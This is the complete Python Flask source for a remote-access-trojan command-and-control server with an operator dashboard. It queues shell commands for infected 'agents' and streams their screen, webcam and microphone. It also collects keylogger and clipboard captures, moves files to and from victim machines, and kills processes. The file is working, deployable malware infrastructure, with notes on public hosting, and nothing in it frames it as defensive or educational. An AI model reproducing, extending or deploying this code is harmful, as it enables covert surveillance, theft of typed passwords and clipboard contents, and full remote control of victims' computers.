from flask import Flask, request, jsonify, redirect, url_for, Response, send_file
from collections import defaultdict
import datetime
import time
import queue
import os
import base64
import tempfile

app = Flask(__name__)


# --- Web Dashboard HTML ---
DASHBOARD_HTML = """
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>C2 Dashboard</title>
    <style>
        body { font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif; line-height: 1.6; background-color: #f4f4f9; color: #333; margin: 0; padding: 20px; }
        .container { max-width: 900px; margin: auto; background: #fff; padding: 20px; border-radius: 8px; box-shadow: 0 2px 10px rgba(0,0,0,0.1); }
        h1, h2 { color: #444; border-bottom: 2px solid #eee; padding-bottom: 10px; }
        #agent-list { list-style-type: none; padding: 0; }
        #agent-list li { background: #e9e9f3; margin-bottom: 10px; padding: 10px; border-radius: 5px; cursor: pointer; display: flex; justify-content: space-between; align-items: center; transition: background-color 0.2s; }
        #agent-list li:hover { background: #dcdcf0; }
        #agent-list li.selected { background: #6a5acd; color: white; }
        .form-group { margin-bottom: 15px; }
        label { display: block; margin-bottom: 5px; font-weight: bold; }
        input[type="text"] { width: calc(100% - 22px); padding: 10px; border: 1px solid #ccc; border-radius: 4px; }
        input[readonly] { background-color: #eee; }
        button { background-color: #6a5acd; color: white; padding: 10px 15px; border: none; border-radius: 4px; cursor: pointer; font-size: 16px; margin-right: 10px; }
        button:hover { background-color: #5a4cad; }
        #output-display { background: #222; color: #0f0; font-family: "Courier New", Courier, monospace; padding: 15px; border-radius: 5px; white-space: pre-wrap; word-wrap: break-word; min-height: 100px; max-height: 400px; overflow-y: auto; }
        .status { margin-top: 10px; padding: 10px; border-radius: 4px; }
        .status.success { background-color: #d4edda; color: #155724; }
        .status.error { background-color: #f8d7da; color: #721c24; }
        #screen-capture { width: 100%; border: 1px solid #ccc; border-radius: 5px; margin-top: 10px; }
    </style>
</head>
<body>
    <div class="container">
        <h1>C2 Control Dashboard</h1>
        
        <h2>Active Agents</h2>
        <ul id="agent-list"><li>No agents have checked in yet.</li></ul>

        <h2>Agent Control</h2>
        <div class="form-group">
            <label for="agent-id">Selected Agent ID</label>
            <input type="text" id="agent-id" readonly placeholder="Click on an agent from the list above">
        </div>

        <div class="form-group">
            <label for="command">Command to Execute</label>
            <input type="text" id="command" placeholder="e.g., whoami">
        </div>
        <button onclick="issueCommand()">Issue Command</button>
        <div id="command-status" class="status" style="display:none;"></div>

        <h2>Command Output</h2>
        <button onclick="getOutput()">Get Output for Selected Agent</button>
        <pre id="output-display">Output will appear here...</pre>

        <h2>Screen Monitoring</h2>
        <button onclick="startScreenStream()">Start Screen Stream</button>
        <button onclick="startCameraStream()">Start Webcam Stream</button>
        <button onclick="stopAllStreams()">Stop All Streams</button>
        
        <h2>File Management</h2>
        <div class="form-group">
            <label for="file-upload">Upload File to Agent</label>
            <input type="file" id="file-upload" style="margin-bottom: 10px;">
            <input type="text" id="upload-path" placeholder="Destination path on agent (e.g., C:\\temp\\file.txt)">
            <button onclick="uploadFile()" style="margin-top: 10px;">Upload File</button>
        </div>
        <div class="form-group" style="margin-top: 15px;">
            <label for="download-path">Download File from Agent</label>
            <input type="text" id="download-path" placeholder="File path on agent (e.g., C:\\temp\\file.txt)">
            <button onclick="downloadFile()" style="margin-top: 10px;">Download File</button>
        </div>

        <h2>Monitoring</h2>
        <button onclick="startKeylogger()">Start Keylogger</button>
        <button onclick="stopKeylogger()">Stop Keylogger</button>
        <button onclick="getKeylogData()">Get Keylog Data</button>
        <button onclick="startClipboardMonitor()">Start Clipboard Monitor</button>
        <button onclick="stopClipboardMonitor()">Stop Clipboard Monitor</button>
        <button onclick="getClipboardData()">Get Clipboard Data</button>

        <h2>Remote Shell</h2>
        <div class="form-group">
            <label for="shell-command">Shell Command</label>
            <input type="text" id="shell-command" placeholder="Enter command..." onkeypress="handleShellEnter(event)">
            <button onclick="sendShellCommand()">Send</button>
            <button onclick="clearShellOutput()">Clear</button>
        </div>
        <pre id="shell-output" style="background: #000; color: #0f0; font-family: 'Courier New', Courier, monospace; padding: 15px; border-radius: 5px; white-space: pre-wrap; word-wrap: break-word; min-height: 200px; max-height: 400px; overflow-y: auto;">Remote shell output will appear here...</pre>

        <h2>Voice Communication</h2>
        <button id="voice-btn" onclick="toggleVoiceRecording()">Start Voice Recording</button>
        <div id="voice-status" class="status" style="display:none;"></div>

        <h2>Process Management</h2>
        <button onclick="listProcesses()">List Running Processes</button>
        <div class="form-group" style="margin-top: 15px;">
            <label for="process-to-kill">Process Name or PID to Kill</label>
            <input type="text" id="process-to-kill" placeholder="e.g., notepad or 1234">
            <button onclick="killProcess()" style="margin-top: 10px;">Kill Process</button>
        </div>

        <audio id="audio-player" controls style="display:none; width: 100%; margin-top: 10px;"></audio>
    </div>

    <script>
        let selectedAgentId = null;
        let outputPollInterval = null;
        let videoWindow = null;
        let cameraWindow = null;
        let audioPlayer = null;

        function selectAgent(element, agentId) {
            const oldAgentId = selectedAgentId;

            // Stop any active polling when switching agents
            if (outputPollInterval) {
                clearInterval(outputPollInterval);
                outputPollInterval = null;
            }

            // If there was a previously selected agent, tell it to stop monitoring
            if (oldAgentId && oldAgentId !== agentId) {
                issueCommandInternal(oldAgentId, 'stop-stream');
                issueCommandInternal(oldAgentId, 'stop-audio');
                issueCommandInternal(oldAgentId, 'stop-camera');
            }

            if (videoWindow && !videoWindow.closed) {
                videoWindow.close();
                videoWindow = null;
            }

            if (cameraWindow && !cameraWindow.closed) {
                cameraWindow.close();
                cameraWindow = null;
            }

            if (audioPlayer) {
                audioPlayer.pause();
                audioPlayer.src = '';
            }

            document.querySelectorAll('#agent-list li').forEach(item => item.classList.remove('selected'));
            element.classList.add('selected');
            
            selectedAgentId = agentId;
            document.getElementById('agent-id').value = agentId;
            document.getElementById('output-display').textContent = 'Output will appear here...';
            document.getElementById('command-status').style.display = 'none';
            
        }

        async function fetchAgents() {
            try {
                const response = await fetch('/agents');
                const agents = await response.json();
                const agentList = document.getElementById('agent-list');
                agentList.innerHTML = '';

                if (Object.keys(agents).length === 0) {
                    agentList.innerHTML = '<li>No agents have checked in yet.</li>';
                    return;
                }

                for (const agentId in agents) {
                    const agent = agents[agentId];
                    const li = document.createElement('li');
                    li.dataset.agentId = agentId;
                    li.onclick = () => selectAgent(li, agentId);
                    
                    const lastSeen = agent.last_seen ? new Date(agent.last_seen).toLocaleString() : 'Never';
                    li.innerHTML = `<strong>ID:</strong> ${agentId} <small><strong>Last Seen:</strong> ${lastSeen}</small>`;
                    
                    if (agentId === selectedAgentId) {
                        li.classList.add('selected');
                    }
                    
                    agentList.appendChild(li);
                }
            } catch (error) {
                console.error('Error fetching agents:', error);
                document.getElementById('agent-list').innerHTML = '<li>Error loading agents. Is the server running?</li>';
            }
        }

        async function issueCommand() {
            const command = document.getElementById('command').value;
            const statusDiv = document.getElementById('command-status');

            if (!selectedAgentId) { alert('Please select an agent first.'); return; }
            if (!command) { alert('Please enter a command.'); return; }

            // Clear any previous polling interval
            if (outputPollInterval) {
                clearInterval(outputPollInterval);
                outputPollInterval = null;
            }

            document.getElementById('output-display').textContent = 'Waiting for command output...';

            try {
                const response = await fetch('/issue_command', {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({ agent_id: selectedAgentId, command: command })
                });
                const result = await response.json();
                
                statusDiv.style.display = 'block';
                if (response.ok) {
                    statusDiv.className = 'status success';
                    statusDiv.textContent = `Success: ${result.status}`;
                    document.getElementById('command').value = '';

                    // Start polling for the output automatically
                    outputPollInterval = setInterval(getOutput, 3000); // Poll every 3 seconds
                } else {
                    statusDiv.className = 'status error';
                    statusDiv.textContent = `Error: ${result.message}`;
                }
            } catch (error) {
                statusDiv.style.display = 'block';
                statusDiv.className = 'status error';
                statusDiv.textContent = 'Network error. Could not issue command.';
                console.error('Error issuing command:', error);
            }
        }

        async function getOutput() {
            const outputDisplay = document.getElementById('output-display');
            if (!selectedAgentId) { alert('Please select an agent first.'); return; }

            try {
                const response = await fetch(`/get_output/${selectedAgentId}`);
                const result = await response.json();

                if (response.ok) {
                    if (result.output && result.output.length > 0) {
                        outputDisplay.textContent = result.output.join('\\n\\n--- Command Output ---\\n\\n');
                        // Stop polling since we've received the output
                        if (outputPollInterval) {
                            clearInterval(outputPollInterval);
                            outputPollInterval = null;
                        }
                    } else {
                        // If polling is not active, it means this was a manual click with no new output.
                        if (!outputPollInterval) {
                            outputDisplay.textContent = 'No new output from agent.';
                        }
                    }
                } else {
                    outputDisplay.textContent = `Error: ${result.message}`;
                    if (outputPollInterval) {
                        clearInterval(outputPollInterval);
                        outputPollInterval = null;
                    }
                }
            } catch (error) {
                outputDisplay.textContent = 'Network error. Could not retrieve output.';
                console.error('Error getting output:', error);
                if (outputPollInterval) {
                    clearInterval(outputPollInterval);
                    outputPollInterval = null;
                }
            }
        }

        async function startScreenStream() {
            if (!selectedAgentId) { alert('Please select an agent first.'); return; }
            
            // Tell the agent to start both video and audio streams
            await issueCommandInternal(selectedAgentId, 'start-stream'); // Screen stream
            await issueCommandInternal(selectedAgentId, 'start-audio'); // Audio stream

            if (videoWindow && !videoWindow.closed) {
                videoWindow.close();
            }

            // Open video stream in a popup
            const videoUrl = `/video_feed/${selectedAgentId}?t=${new Date().getTime()}`;
            const windowName = `LiveStream_${selectedAgentId}`;
            const windowFeatures = 'width=800,height=600,resizable=yes,scrollbars=no,status=no';
            videoWindow = window.open(videoUrl, windowName, windowFeatures);

            // Start playing audio on the main page
            audioPlayer = document.getElementById('audio-player');
            const audioUrl = `/audio_feed/${selectedAgentId}?t=${new Date().getTime()}`;
            audioPlayer.style.display = 'block';
            audioPlayer.src = audioUrl;
            audioPlayer.play();
        }

        async function startCameraStream() {
            if (!selectedAgentId) { alert('Please select an agent first.'); return; }

            await issueCommandInternal(selectedAgentId, 'start-camera');

            if (cameraWindow && !cameraWindow.closed) {
                cameraWindow.close();
            }

            const cameraUrl = `/camera_feed/${selectedAgentId}?t=${new Date().getTime()}`;
            const windowName = `CameraStream_${selectedAgentId}`;
            const windowFeatures = 'width=640,height=480,resizable=yes,scrollbars=no,status=no';
            cameraWindow = window.open(cameraUrl, windowName, windowFeatures);
        }

        async function stopAllStreams() {
            if (selectedAgentId) {
                // Tell the agent to stop both streams
                await issueCommandInternal(selectedAgentId, 'stop-stream');
                await issueCommandInternal(selectedAgentId, 'stop-audio');
                await issueCommandInternal(selectedAgentId, 'stop-camera');
            }
            if (audioPlayer) {
                audioPlayer.pause();
                audioPlayer.src = '';
                audioPlayer.style.display = 'none';
            }
            if (videoWindow && !videoWindow.closed) {
                videoWindow.close();
                videoWindow = null;
            }
            if (cameraWindow && !cameraWindow.closed) {
                cameraWindow.close();
                cameraWindow = null;
            }
        }

        function listProcesses() {
            const commandInput = document.getElementById('command');
            // Select Name, Id, and MainWindowTitle for a more informative process list.
            commandInput.value = 'Get-Process | Select-Object Name, Id, MainWindowTitle | Format-Table -AutoSize';
            issueCommand();
        }

        function killProcess() {
            const processInput = document.getElementById('process-to-kill');
            const target = processInput.value.trim();
            if (!target) { alert('Please enter a process name or PID.'); return; }

            let command = '';
            // Check if target is purely numeric to decide between -Id and -Name
            if (/^\d+$/.test(target)) {
                command = `Stop-Process -Id ${target} -Force`;
            } else {
                command = `Stop-Process -Name "${target}" -Force`;
            }
            
            document.getElementById('command').value = command;
            issueCommand();
            processInput.value = ''; // Clear the input after issuing
        }

        // Helper function to issue commands without showing status to the user (for internal tasks)
        async function issueCommandInternal(agentId, command) {
            if (!agentId) return;
            try {
                await fetch('/issue_command', {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({ agent_id: agentId, command: command })
                });
            } catch (error) {
                console.error(`Error issuing internal command '${command}':`, error);
            }
        }

        // File Management Functions
        async function uploadFile() {
            if (!selectedAgentId) { alert('Please select an agent first.'); return; }
            
            const fileInput = document.getElementById('file-upload');
            const pathInput = document.getElementById('upload-path');
            
            if (!fileInput.files[0]) { alert('Please select a file to upload.'); return; }
            if (!pathInput.value) { alert('Please specify destination path.'); return; }
            
            const file = fileInput.files[0];
            const formData = new FormData();
            formData.append('file', file);
            formData.append('agent_id', selectedAgentId);
            formData.append('destination_path', pathInput.value);
            
            try {
                const response = await fetch('/upload_file', {
                    method: 'POST',
                    body: formData
                });
                const result = await response.json();
                
                if (response.ok) {
                    alert('File upload initiated successfully!');
                    fileInput.value = '';
                    pathInput.value = '';
                } else {
                    alert(`Upload failed: ${result.message}`);
                }
            } catch (error) {
                alert('Network error during file upload.');
                console.error('Upload error:', error);
            }
        }

        async function downloadFile() {
            if (!selectedAgentId) { alert('Please select an agent first.'); return; }
            
            const pathInput = document.getElementById('download-path');
            if (!pathInput.value) { alert('Please specify file path to download.'); return; }
            
            try {
                const response = await fetch('/download_file', {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({ 
                        agent_id: selectedAgentId, 
                        file_path: pathInput.value 
                    })
                });
                
                if (response.ok) {
                    const blob = await response.blob();
                    const url = window.URL.createObjectURL(blob);
                    const a = document.createElement('a');
                    a.href = url;
                    a.download = pathInput.value.split('\\').pop().split('/').pop();
                    document.body.appendChild(a);
                    a.click();
                    window.URL.revokeObjectURL(url);
                    document.body.removeChild(a);
                    pathInput.value = '';
                } else {
                    const result = await response.json();
                    alert(`Download failed: ${result.message}`);
                }
            } catch (error) {
                alert('Network error during file download.');
                console.error('Download error:', error);
            }
        }

        // Monitoring Functions
        function startKeylogger() {
            if (!selectedAgentId) { alert('Please select an agent first.'); return; }
            issueCommandInternal(selectedAgentId, 'start-keylogger');
            alert('Keylogger started on agent.');
        }

        function stopKeylogger() {
            if (!selectedAgentId) { alert('Please select an agent first.'); return; }
            issueCommandInternal(selectedAgentId, 'stop-keylogger');
            alert('Keylogger stopped on agent.');
        }

        async function getKeylogData() {
            if (!selectedAgentId) { alert('Please select an agent first.'); return; }
            
            try {
                const response = await fetch(`/get_keylog_data/${selectedAgentId}`);
                const result = await response.json();
                
                if (response.ok && result.data) {
                    document.getElementById('output-display').textContent = 'KEYLOG DATA:\n' + result.data;
                } else {
                    document.getElementById('output-display').textContent = 'No keylog data available.';
                }
            } catch (error) {
                console.error('Error getting keylog data:', error);
            }
        }

        function startClipboardMonitor() {
            if (!selectedAgentId) { alert('Please select an agent first.'); return; }
            issueCommandInternal(selectedAgentId, 'start-clipboard');
            alert('Clipboard monitoring started on agent.');
        }

        function stopClipboardMonitor() {
            if (!selectedAgentId) { alert('Please select an agent first.'); return; }
            issueCommandInternal(selectedAgentId, 'stop-clipboard');
            alert('Clipboard monitoring stopped on agent.');
        }

        async function getClipboardData() {
            if (!selectedAgentId) { alert('Please select an agent first.'); return; }
            
            try {
                const response = await fetch(`/get_clipboard_data/${selectedAgentId}`);
                const result = await response.json();
                
                if (response.ok && result.data) {
                    document.getElementById('output-display').textContent = 'CLIPBOARD DATA:\n' + result.data;
                } else {
                    document.getElementById('output-display').textContent = 'No clipboard data available.';
                }
            } catch (error) {
                console.error('Error getting clipboard data:', error);
            }
        }

        // Remote Shell Functions
        function handleShellEnter(event) {
            if (event.key === 'Enter') {
                sendShellCommand();
            }
        }

        async function sendShellCommand() {
            if (!selectedAgentId) { alert('Please select an agent first.'); return; }
            
            const commandInput = document.getElementById('shell-command');
            const command = commandInput.value.trim();
            
            if (!command) return;
            
            const shellOutput = document.getElementById('shell-output');
            shellOutput.textContent += `> ${command}\n`;
            
            try {
                const response = await fetch('/shell_command', {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({ 
                        agent_id: selectedAgentId, 
                        command: command 
                    })
                });
                const result = await response.json();
                
                if (response.ok) {
                    shellOutput.textContent += result.output + '\n';
                } else {
                    shellOutput.textContent += `Error: ${result.message}\n`;
                }
                
                shellOutput.scrollTop = shellOutput.scrollHeight;
                commandInput.value = '';
            } catch (error) {
                shellOutput.textContent += 'Network error executing command.\n';
                console.error('Shell command error:', error);
            }
        }

        function clearShellOutput() {
            document.getElementById('shell-output').textContent = 'Remote shell output will appear here...';
        }

        // Voice Communication Functions
        let mediaRecorder;
        let audioChunks = [];
        let isRecording = false;

        async function toggleVoiceRecording() {
            const voiceBtn = document.getElementById('voice-btn');
            const voiceStatus = document.getElementById('voice-status');
            
            if (!isRecording) {
                try {
                    const stream = await navigator.mediaDevices.getUserMedia({ audio: true });
                    mediaRecorder = new MediaRecorder(stream);
                    audioChunks = [];
                    
                    mediaRecorder.ondataavailable = event => {
                        audioChunks.push(event.data);
                    };
                    
                    mediaRecorder.onstop = async () => {
                        const audioBlob = new Blob(audioChunks, { type: 'audio/wav' });
                        await sendVoiceToAgent(audioBlob);
                    };
                    
                    mediaRecorder.start();
                    isRecording = true;
                    voiceBtn.textContent = 'Stop Voice Recording';
                    voiceStatus.style.display = 'block';
                    voiceStatus.className = 'status success';
                    voiceStatus.textContent = 'Recording... Click stop when finished.';
                } catch (error) {
                    voiceStatus.style.display = 'block';
                    voiceStatus.className = 'status error';
                    voiceStatus.textContent = 'Error accessing microphone.';
                    console.error('Voice recording error:', error);
                }
            } else {
                mediaRecorder.stop();
                mediaRecorder.stream.getTracks().forEach(track => track.stop());
                isRecording = false;
                voiceBtn.textContent = 'Start Voice Recording';
                voiceStatus.style.display = 'none';
            }
        }

        async function sendVoiceToAgent(audioBlob) {
            if (!selectedAgentId) { alert('Please select an agent first.'); return; }
            
            const formData = new FormData();
            formData.append('audio', audioBlob, 'voice.wav');
            formData.append('agent_id', selectedAgentId);
            
            try {
                const response = await fetch('/send_voice', {
                    method: 'POST',
                    body: formData
                });
                const result = await response.json();
                
                const voiceStatus = document.getElementById('voice-status');
                voiceStatus.style.display = 'block';
                if (response.ok) {
                    voiceStatus.className = 'status success';
                    voiceStatus.textContent = 'Voice message sent to agent successfully!';
                } else {
                    voiceStatus.className = 'status error';
                    voiceStatus.textContent = `Failed to send voice: ${result.message}`;
                }
                
                setTimeout(() => {
                    voiceStatus.style.display = 'none';
                }, 3000);
            } catch (error) {
                console.error('Error sending voice:', error);
            }
        }



        // Auto-refresh agents every 5 seconds
        setInterval(fetchAgents, 5000);

        // Initial fetch
        window.onload = fetchAgents;
    </script>
</body>
</html>
"""

# In-memory storage for multi-agent support.
AGENTS_DATA = defaultdict(lambda: {"commands": [], "output": [], "last_seen": None})

VIDEO_FRAMES = defaultdict(lambda: None)
CAMERA_FRAMES = defaultdict(lambda: None)
AUDIO_CHUNKS = defaultdict(lambda: queue.Queue())
KEYLOG_DATA = defaultdict(lambda: [])
CLIPBOARD_DATA = defaultdict(lambda: [])
VOICE_COMMANDS = defaultdict(lambda: queue.Queue())
# --- Operator-facing endpoints ---

@app.route("/")
def index():
    """
    Redirect root to the dashboard.
    """
    return redirect(url_for('dashboard'))

@app.route("/dashboard")
def dashboard():
    """
    Serves the main HTML dashboard.
    """
    return DASHBOARD_HTML

@app.route("/issue_command", methods=["POST"])
def issue_command():
    """
    Receives a command from the operator and queues it for a specific agent.
    JSON body: { "agent_id": "some_guid", "command": "whoami" }
    """
    data = request.json
    agent_id = data.get("agent_id")
    command = data.get("command")

    if not agent_id or not command:
        return jsonify({"status": "error", "message": "'agent_id' and 'command' are required"}), 400

    AGENTS_DATA[agent_id]["commands"].append(command)
    return jsonify({"status": f"Command queued for agent {agent_id}"})

@app.route("/get_output/<agent_id>", methods=["GET"])
def get_agent_output(agent_id):
    """
    Retrieves and clears the output from a specific agent for the operator.
    """
    if agent_id not in AGENTS_DATA:
        return jsonify({"status": "error", "message": "Agent not found"}), 404
    
    output_list = AGENTS_DATA[agent_id]["output"]
    AGENTS_DATA[agent_id]["output"] = []  # Clear output after retrieval
    
    return jsonify({"agent_id": agent_id, "output": output_list})

@app.route('/stream/<agent_id>', methods=['POST'])
def stream_in(agent_id):
    """Receives a video frame from an agent."""
    VIDEO_FRAMES[agent_id] = request.data
    return "OK", 200

def generate_video_frames(agent_id):
    """Generator function to stream video frames to the dashboard."""
    while True:
        time.sleep(0.05) # Yield frames at a consistent rate
        frame = VIDEO_FRAMES.get(agent_id)
        if frame:
            yield (b'--frame\r\n'
                   b'Content-Type: image/jpeg\r\n\r\n' + frame + b'\r\n')

@app.route('/video_feed/<agent_id>')
def video_feed(agent_id):
    """Serves the MJPEG video stream to the dashboard."""
    return Response(generate_video_frames(agent_id),
                    mimetype='multipart/x-mixed-replace; boundary=frame')

@app.route('/camera/<agent_id>', methods=['POST'])
def camera_in(agent_id):
    """Receives a camera frame from an agent."""
    CAMERA_FRAMES[agent_id] = request.data
    return "OK", 200

def generate_camera_frames(agent_id):
    """Generator function to stream camera frames to the dashboard."""
    last_frame_time = time.time()
    while True:
        time.sleep(0.05)
        frame = CAMERA_FRAMES.get(agent_id)
        if frame:
            last_frame_time = time.time() # Reset timer on new frame
            yield (b'--frame\r\n'
                   b'Content-Type: image/jpeg\r\n\r\n' + frame + b'\r\n')
        elif time.time() - last_frame_time > 10.0: # 10 second timeout
            print(f"Camera stream for {agent_id} timed out. No frames received.")
            break # Stop the generator, close the connection

@app.route('/camera_feed/<agent_id>')
def camera_feed(agent_id):
    """Serves the MJPEG camera stream to the dashboard."""
    return Response(generate_camera_frames(agent_id),
                    mimetype='multipart/x-mixed-replace; boundary=frame')

@app.route('/audio/<agent_id>', methods=['POST'])
def audio_in(agent_id):
    """Receives an audio chunk from an agent."""
    AUDIO_CHUNKS[agent_id].put(request.data)
    return "OK", 200

def generate_audio_stream(agent_id):
    """Generator function to stream audio chunks as a WAV file."""
    # WAV header parameters
    CHANNELS = 1
    RATE = 44100
    BITS_PER_SAMPLE = 16
    
    # Construct WAV header for an infinitely long stream.
    # The key is to set the file size and data size to maximum (0xFFFFFFFF)
    # to tell the browser to just keep reading.
    header = bytearray()
    header.extend(b'RIFF')
    header.extend((0xFFFFFFFF).to_bytes(4, 'little')) # Max file size for streaming
    header.extend(b'WAVE')
    header.extend(b'fmt ')
    header.extend((16).to_bytes(4, 'little')) # Sub-chunk size
    header.extend((1).to_bytes(2, 'little')) # PCM format
    header.extend(CHANNELS.to_bytes(2, 'little'))
    header.extend(RATE.to_bytes(4, 'little'))
    header.extend((RATE * CHANNELS * BITS_PER_SAMPLE // 8).to_bytes(4, 'little')) # Byte rate
    header.extend((CHANNELS * BITS_PER_SAMPLE // 8).to_bytes(2, 'little')) # Block align
    header.extend(BITS_PER_SAMPLE.to_bytes(2, 'little'))
    header.extend(b'data')
    header.extend((0xFFFFFFFF).to_bytes(4, 'little')) # Max data size for streaming
    yield header

    q = AUDIO_CHUNKS[agent_id]
    while True:
        yield q.get()

@app.route('/audio_feed/<agent_id>')
def audio_feed(agent_id):
    """Serves the WAV audio stream to the dashboard."""
    return Response(generate_audio_stream(agent_id), mimetype='audio/wav')

@app.route("/agents", methods=["GET"])
def get_agents():
    """
    Lists all agents that have checked in and their last seen time.
    """
    return jsonify(AGENTS_DATA)

# --- File Management Endpoints ---

@app.route("/upload_file", methods=["POST"])
def upload_file():
    """Upload a file to be sent to an agent."""
    if 'file' not in request.files:
        return jsonify({"status": "error", "message": "No file provided"}), 400
    
    file = request.files['file']
    agent_id = request.form.get('agent_id')
    destination_path = request.form.get('destination_path')
    
    if not agent_id or not destination_path:
        return jsonify({"status": "error", "message": "agent_id and destination_path required"}), 400
    
    # Read file content and encode as base64
    file_content = base64.b64encode(file.read()).decode('utf-8')
    
    # Queue the upload command for the agent
    upload_command = f"upload-file:{destination_path}:{file_content}"
    AGENTS_DATA[agent_id]["commands"].append(upload_command)
    
    return jsonify({"status": "success", "message": "File upload queued for agent"})

@app.route("/download_file", methods=["POST"])
def download_file():
    """Request a file download from an agent."""
    data = request.json
    agent_id = data.get("agent_id")
    file_path = data.get("file_path")
    
    if not agent_id or not file_path:
        return jsonify({"status": "error", "message": "agent_id and file_path required"}), 400
    
    # Queue the download command for the agent
    download_command = f"download-file:{file_path}"
    AGENTS_DATA[agent_id]["commands"].append(download_command)
    
    # Wait for the file to be uploaded by the agent (simple polling approach)
    # In a production system, you'd want a more sophisticated mechanism
    import time
    for _ in range(30):  # Wait up to 30 seconds
        time.sleep(1)
        # Check if agent has uploaded the file
        temp_file_path = f"/tmp/download_{agent_id}_{os.path.basename(file_path)}"
        if os.path.exists(temp_file_path):
            return send_file(temp_file_path, as_attachment=True, download_name=os.path.basename(file_path))
    
    return jsonify({"status": "error", "message": "File download timeout"}), 408

@app.route("/file_upload/<agent_id>", methods=["POST"])
def receive_file_from_agent(agent_id):
    """Receive a file uploaded by an agent."""
    data = request.json
    filename = data.get("filename")
    file_content_b64 = data.get("content")
    
    if not filename or not file_content_b64:
        return jsonify({"status": "error", "message": "filename and content required"}), 400
    
    try:
        # Decode base64 content
        file_content = base64.b64decode(file_content_b64)
        
        # Save to temporary file
        temp_file_path = f"/tmp/download_{agent_id}_{filename}"
        with open(temp_file_path, 'wb') as f:
            f.write(file_content)
        
        return jsonify({"status": "success"})
    except Exception as e:
        return jsonify({"status": "error", "message": str(e)}), 500

# --- Monitoring Endpoints ---

@app.route("/keylog_data/<agent_id>", methods=["POST"])
def receive_keylog_data(agent_id):
    """Receive keylog data from an agent."""
    data = request.json
    keylog_entry = data.get("data")
    
    if keylog_entry:
        KEYLOG_DATA[agent_id].append(keylog_entry)
    
    return jsonify({"status": "received"})

@app.route("/get_keylog_data/<agent_id>", methods=["GET"])
def get_keylog_data(agent_id):
    """Get accumulated keylog data for an agent."""
    data = KEYLOG_DATA[agent_id]
    KEYLOG_DATA[agent_id] = []  # Clear after retrieval
    return jsonify({"data": "\n".join(data)})

@app.route("/clipboard_data/<agent_id>", methods=["POST"])
def receive_clipboard_data(agent_id):
    """Receive clipboard data from an agent."""
    data = request.json
    clipboard_entry = data.get("data")
    
    if clipboard_entry:
        CLIPBOARD_DATA[agent_id].append(clipboard_entry)
    
    return jsonify({"status": "received"})

@app.route("/get_clipboard_data/<agent_id>", methods=["GET"])
def get_clipboard_data(agent_id):
    """Get accumulated clipboard data for an agent."""
    data = CLIPBOARD_DATA[agent_id]
    CLIPBOARD_DATA[agent_id] = []  # Clear after retrieval
    return jsonify({"data": "\n".join(data)})

# --- Shell and Voice Endpoints ---

@app.route("/shell_command", methods=["POST"])
def shell_command():
    """Execute a shell command and return immediate response."""
    data = request.json
    agent_id = data.get("agent_id")
    command = data.get("command")
    
    if not agent_id or not command:
        return jsonify({"status": "error", "message": "agent_id and command required"}), 400
    
    # Queue the command
    AGENTS_DATA[agent_id]["commands"].append(command)
    
    # Wait for response (simplified approach)
    import time
    for _ in range(10):  # Wait up to 10 seconds
        time.sleep(1)
        output_list = AGENTS_DATA[agent_id]["output"]
        if output_list:
            output = output_list.pop(0)
            return jsonify({"output": output})
    
    return jsonify({"output": "Command timeout or no response"})

@app.route("/send_voice", methods=["POST"])
def send_voice():
    """Send voice command to agent."""
    if 'audio' not in request.files:
        return jsonify({"status": "error", "message": "No audio file provided"}), 400
    
    audio_file = request.files['audio']
    agent_id = request.form.get('agent_id')
    
    if not agent_id:
        return jsonify({"status": "error", "message": "agent_id required"}), 400
    
    # Save audio file temporarily
    temp_audio_path = f"/tmp/voice_{agent_id}_{int(time.time())}.wav"
    audio_file.save(temp_audio_path)
    
    # Read and encode audio
    with open(temp_audio_path, 'rb') as f:
        audio_content = base64.b64encode(f.read()).decode('utf-8')
    
    # Queue voice command for agent
    voice_command = f"play-voice:{audio_content}"
    AGENTS_DATA[agent_id]["commands"].append(voice_command)
    
    # Clean up temp file
    os.unlink(temp_audio_path)
    
    return jsonify({"status": "success", "message": "Voice command sent to agent"})

# --- Agent-facing endpoints ---

@app.route("/get_task/<agent_id>", methods=["GET"])
def get_task(agent_id):
    """
    Called by an agent to get its next command.
    """
    # This serves as a heartbeat, updating the last_seen time.
    AGENTS_DATA[agent_id]["last_seen"] = datetime.datetime.utcnow().isoformat() + "Z"

    commands = AGENTS_DATA[agent_id]["commands"]
    if commands:
        command = commands.pop(0)
        return jsonify({"command": command})
    
    # If no commands, tell the agent to sleep.
    return jsonify({"command": "sleep"})

@app.route("/post_output/<agent_id>", methods=["POST"])
def post_output(agent_id):
    """
    Called by an agent to post the output of an executed command.
    """
    data = request.json
    output = data.get("output")

    if output is None:
        return jsonify({"status": "error", "message": "'output' is required"}), 400

    AGENTS_DATA[agent_id]["output"].append(output)
    return jsonify({"status": "output received"})

if __name__ == "__main__":
    # For deployment on services like Render or Railway, they will use a production WSGI server.
    # The host '0.0.0.0' makes the server accessible externally.
    # IMPORTANT: debug=False is critical for security in a live environment.
    app.run(host="0.0.0.0", port=8080, debug=False)
